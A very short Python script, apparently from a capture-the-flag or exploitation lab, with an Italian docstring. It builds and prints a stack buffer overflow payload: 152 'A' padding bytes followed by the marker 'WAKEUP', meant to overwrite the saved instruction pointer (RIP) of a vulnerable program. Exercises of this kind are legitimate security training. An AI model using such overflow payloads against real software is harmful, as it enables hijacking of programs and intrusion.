MAGIC_N = 152
"""
Scrive nel registro rip il valore WAKEUP
"""
if __name__ == '__main__':
    rip_ = 'WAKEUP'
    inject = (MAGIC_N)  * 'A'  + rip_
    print(inject)
